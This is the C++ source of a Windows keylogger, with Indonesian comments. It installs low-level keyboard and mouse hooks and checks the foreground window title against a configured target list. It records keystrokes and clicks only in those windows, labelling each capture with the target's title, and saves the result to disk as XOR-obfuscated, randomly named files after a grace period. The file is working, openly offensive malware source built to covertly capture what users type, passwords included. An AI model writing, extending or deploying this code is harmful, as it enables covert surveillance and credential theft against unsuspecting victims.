#include "keylogger.h"
#include "utils.h"
#include "encryption.h"
#include "config.h" 
#include <iostream>
#include <fstream>
#include <filesystem>
#include <random>
#include <ctime>
#include <thread>
#include <chrono>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <mutex>
#include <algorithm>

using namespace std;

// --- Globals ---
std::atomic<bool> isRunning{ true };
std::queue<KeyEvent> rawKeyQueue; 
std::mutex queueMtx;
std::condition_variable queueCv;

static std::string sessionBuffer;
static std::string currentWindow;
static std::string pendingHeader; 
static bool isTargetActive = false; 
static bool isPasswordMode = false; 
static std::mutex bufferMtx;

std::atomic<bool> isSensitiveContext{ false }; 

// --- Variabel Baru untuk Grace Period ---
static std::chrono::steady_clock::time_point leftSensitiveTime;
static bool isPendingFlush = false;
const int GRACE_PERIOD_SECONDS = 15; // Waktu tunggu sebelum file dipotong

std::string GetRandomSuffix(int length) {
    static const char alphanum[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    std::string s;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);
    
    for (int i = 0; i < length; ++i) {
        s += alphanum[dis(gen)];
    }
    return s;
}

std::string MapKeyToString(DWORD vkCode, bool shift, bool caps) {
    if (vkCode == VK_BACK)   return "[BKSP]"; 
    if (vkCode == VK_RETURN) {
        isPasswordMode = false; 
        return "\n";
    }
    if (vkCode == VK_SPACE)  return " ";
    if (vkCode == VK_TAB)    return " [TAB] ";
    if (vkCode == VK_ESCAPE) return " [ESC] ";
    if (vkCode >= VK_F1 && vkCode <= VK_F12) return " [F" + std::to_string(vkCode - VK_F1 + 1) + "] ";

    BYTE keyboardState[256] = {0};
    if (shift) keyboardState[VK_SHIFT] = 0x80;
    if (caps) keyboardState[VK_CAPITAL] = 0x01;

    WCHAR buffer[5];
    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    int result = ToUnicode(vkCode, scanCode, keyboardState, buffer, 4, 0);

    if (result > 0) {
        return Ws2S(std::wstring(buffer, result));
    }

    return "";
}

void AppendToBuffer(std::string key) {
    std::lock_guard<std::mutex> lock(bufferMtx);
    
    if (!pendingHeader.empty()) {
        sessionBuffer += pendingHeader;
        pendingHeader.clear();
    }

    if (key == "[BKSP]") {
        if (!sessionBuffer.empty()) {
            if (sessionBuffer.back() != '\n' && sessionBuffer.back() != ' ' && sessionBuffer.back() != ']') {
                sessionBuffer.pop_back(); 
            } else {
                sessionBuffer += "[BKSP]";
            }
        }
    } else {
        sessionBuffer += key;
    }
}

// --- Perbaikan Utama: Context Monitor dengan Grace Period ---
void ContextMonitorWorker() {
    while (isRunning) {
        HWND hwnd = GetForegroundWindow();
        bool matched = false;
        std::string winTitle = "";

        if (hwnd != NULL) {
            wchar_t title[512];
            if (GetWindowTextW(hwnd, title, 512) > 0) {
                winTitle = Ws2S(title);
                string winTitleLower = winTitle;
                transform(winTitleLower.begin(), winTitleLower.end(), winTitleLower.begin(), ::tolower);

                for (const auto& key : Config::BLACKLIST) {
                    string keyLower = key;
                    transform(keyLower.begin(), keyLower.end(), keyLower.begin(), ::tolower);
                    if (winTitleLower.find(keyLower) != string::npos) {
                        matched = true;
                        break;
                    }
                }
            }
        }

        // LOGIKA GRACE PERIOD
        if (isSensitiveContext && !matched) {
            // Baru saja pindah dari jendela sensitif ke aman
            isPendingFlush = true;
            leftSensitiveTime = std::chrono::steady_clock::now();
        }

        if (isPendingFlush) {
            if (matched) {
                // Pengguna kembali ke jendela sensitif sebelum waktu habis
                isPendingFlush = false; 
            } else {
                // Masih di jendela aman, cek apakah sudah melewati batas waktu
                auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::steady_clock::now() - leftSensitiveTime).count();
                
                if (elapsed >= GRACE_PERIOD_SECONDS) {
                    FlushKeylogToDisk();
                    isPendingFlush = false;
                }
            }
        }

        // Update status context secara real-time untuk filter ketikan
        if (winTitle != currentWindow) {
            isSensitiveContext = matched;
            currentWindow = winTitle;

            if (isSensitiveContext) {
                std::lock_guard<std::mutex> lock(bufferMtx);
                pendingHeader = "\n\n[TARGET: " + winTitle + "]\n> ";
            }
        } else {
            isSensitiveContext = matched;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(800)); 
    }
}

void KeylogProcessorWorker() {
    while (isRunning) {
        KeyEvent evt; 
        {
            std::unique_lock<std::mutex> lock(queueMtx);
            queueCv.wait(lock, [] { return !rawKeyQueue.empty() || !isRunning; });
            if (!isRunning && rawKeyQueue.empty()) break;
            
            evt = rawKeyQueue.front();
            rawKeyQueue.pop();
        }

        // Hanya catat jika sedang di context sensitif
        if (isSensitiveContext) { 
            std::string keyStr = MapKeyToString(evt.vkCode, evt.isShift, evt.isCaps);
            if (!keyStr.empty()) {
                AppendToBuffer(keyStr);
            }
        }
    }
}

void FlushKeylogToDisk() {
    std::string dataToSave;
    {
        std::lock_guard<std::mutex> lock(bufferMtx);
        // Minimal 5 karakter agar tidak menyimpan file kosong/header saja
        if (sessionBuffer.length() < 5) {
            sessionBuffer.clear();
            return;
        }
        dataToSave = sessionBuffer;
        sessionBuffer.clear();
    }

    std::vector<BYTE> encrypted(dataToSave.begin(), dataToSave.end());
    XORData(encrypted);

    try {
        std::error_code ec;
        std::filesystem::path p_dir = GetCache("keylog");
        if (!std::filesystem::exists(p_dir)) {
            std::filesystem::create_directories(p_dir, ec);
        }
        
        std::string fileName = "kb_" + GetRandomSuffix(8) + ".dat";
        std::ofstream ofs(p_dir / fileName, std::ios::binary);
        
        if (ofs.is_open()) {
            ofs.write(reinterpret_cast<const char*>(encrypted.data()), encrypted.size());
            ofs.close();
        }
    } catch (...) {}
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN) {
            std::unique_lock<std::mutex> lock(bufferMtx, std::try_to_lock);
            if (lock.owns_lock() && isSensitiveContext) {
                if (!sessionBuffer.empty() && sessionBuffer.back() != ' ') {
                    sessionBuffer += " [CLICK] ";
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        
        bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        
        KeyEvent evt = { kbs->vkCode, shift, caps };
        {
            std::lock_guard<std::mutex> lock(queueMtx);
            rawKeyQueue.push(evt);
        }
        queueCv.notify_one();
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void KeylogLoop() {
    isRunning = true;
    std::thread m(ContextMonitorWorker);
    std::thread p(KeylogProcessorWorker);

    HHOOK hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    HHOOK hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, LowLevelMouseProc, GetModuleHandle(NULL), 0);

    if (hKeyHook) {
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hKeyHook);
        if (hMouseHook) UnhookWindowsHookEx(hMouseHook);
    }

    isRunning = false;
    queueCv.notify_all();
    if (m.joinable()) m.join();
    if (p.joinable()) p.join();
    
    FlushKeylogToDisk();
}